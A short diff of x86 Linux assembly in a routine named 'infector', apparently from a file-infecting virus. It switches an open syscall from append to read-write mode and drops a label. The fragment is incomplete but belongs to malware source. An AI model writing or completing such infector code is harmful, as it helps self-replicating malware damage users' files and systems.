@@ -73,10 +73,9 @@ infector:
     pushad
     mov eax, 5
     mov ebx, [ebp+8]
-    mov ecx, 1025
+    mov ecx, 2
     mov edx, 0777
     int 0x80
-L10:
 
     mov [ebp-4],eax
     mov eax, 4
